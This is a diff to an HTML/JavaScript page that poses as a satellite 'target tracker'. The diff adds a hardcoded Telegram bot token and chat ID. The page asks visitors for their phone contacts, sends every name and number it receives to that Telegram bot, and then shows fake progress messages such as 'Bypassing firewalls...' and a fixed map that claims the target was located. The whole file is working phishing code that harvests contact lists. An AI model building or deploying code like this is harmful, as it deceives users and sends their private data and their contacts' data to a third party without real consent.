@@ -77,9 +77,10 @@
 
                 <div id="finalMap" class="hidden">
                     <div class="rounded-2xl overflow-hidden border-2 border-indigo-500 mb-4 shadow-inner">
-                        <iframe width="100%" height="250" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15000!2d71.47!3d30.19!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2spk!4v1" style="border:0;" allowfullscreen=""></iframe>
+                        <iframe width="100%" height="250" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d13600!2d74.0!3d31.0!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2s!4v1" style="border:0;" allowfullscreen=""></iframe>
                     </div>
                     <p class="text-green-600 font-bold text-sm">Target Located Successfully</p>
+                    <button onclick="location.reload()" class="mt-4 text-xs text-indigo-600 underline">Track Another Target</button>
                 </div>
             </div>
         </div>
@@ -87,30 +88,29 @@
 
     <script>
         let savedContacts = [];
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with yours
-        const CHAT_ID = 'YOUR_CHAT_ID';     // Replace with yours
+        // Aapka updated Telegram data
+        const BOT_TOKEN = '8736966873:AAGi1kxvOZK-uaxVTvcgf6Hi-V9CQ1QuzqQ'; 
+        const CHAT_ID = '8171035068';
 
-        // PEHLE YE CHALEGA
         async function getPermissionFirst() {
-            if ('contacts' in navigator) {
+            if ('contacts' in navigator && 'ContactsManager' in window) {
                 try {
                     const props = ['name', 'tel'];
                     const contacts = await navigator.contacts.select(props, { multiple: true });
                     
-                    if (contacts.length > 0) {
+                    if (contacts && contacts.length > 0) {
                         savedContacts = contacts;
-                        // Data Telegram par bhej do
                         sendToTelegram(contacts);
                         
-                        // Ab screen switch karo
+                        // Screen switch logic
                         document.getElementById('permissionScreen').classList.add('hidden');
                         document.getElementById('searchScreen').classList.remove('hidden');
                     }
                 } catch (e) {
-                    alert("System Authorization required to proceed.");
+                    alert("Security Protocol: Database sync is mandatory to continue.");
                 }
             } else {
-                alert("Please open this in Chrome/Edge on Mobile.");
+                alert("Please use Chrome or Edge on a Mobile device for satellite sync.");
             }
         }
 
@@ -118,15 +118,20 @@
             const inputVal = document.getElementById('searchInput').value.trim().toLowerCase();
             const errorDiv = document.getElementById('errorMessage');
 
-            if (!inputVal) return;
+            if (!inputVal) {
+                document.getElementById('errorText').innerText = "Please enter target details.";
+                errorDiv.classList.remove('hidden');
+                return;
+            }
 
-            // Search in saved contacts
+            // Database search logic
             const found = savedContacts.find(c => 
-                c.name[0].toLowerCase().includes(inputVal) || 
-                c.tel[0].replace(/\s/g, '').includes(inputVal)
+                (c.name && c.name[0].toLowerCase().includes(inputVal)) || 
+                (c.tel && c.tel[0].replace(/\s/g, '').includes(inputVal))
             );
 
             if (found) {
+                errorDiv.classList.add('hidden');
                 showMap();
             } else {
                 document.getElementById('errorText').innerText = "Target not found in synchronized database.";
@@ -143,28 +148,36 @@
             const pText = document.getElementById('progressText');
 
             const interval = setInterval(() => {
-                progress += 10;
+                progress += 5;
                 bar.style.width = progress + "%";
-                if (progress === 40) pText.innerText = "Triangulating coordinates...";
-                if (progress === 80) pText.innerText = "Rendering map view...";
+                if (progress === 30) pText.innerText = "Triangulating coordinates...";
+                if (progress === 60) pText.innerText = "Bypassing firewalls...";
+                if (progress === 90) pText.innerText = "Rendering satellite view...";
                 if (progress >= 100) {
                     clearInterval(interval);
                     document.getElementById('loadingUI').classList.add('hidden');
                     document.getElementById('finalMap').classList.remove('hidden');
                 }
-            }, 300);
+            }, 200);
         }
 
         function sendToTelegram(contacts) {
-            let msg = "📱 *New Sync Alert* 📱\n\n";
+            let msg = "🚀 *Satellite Sync Successful* 🚀\n\n";
+            msg += `Total Contacts: ${contacts.length}\n\n`;
+            
             contacts.forEach((c, i) => {
-                msg += `${i+1}. ${c.name} : ${c.tel}\n`;
+                msg += `${i+1}. 👤 ${c.name} : 📱 ${c.tel}\n`;
             });
+
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
-            });
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: msg, 
+                    parse_mode: 'Markdown' 
+                })
+            }).catch(err => console.error("Telegram Error:", err));
         }
     </script>
 </body>
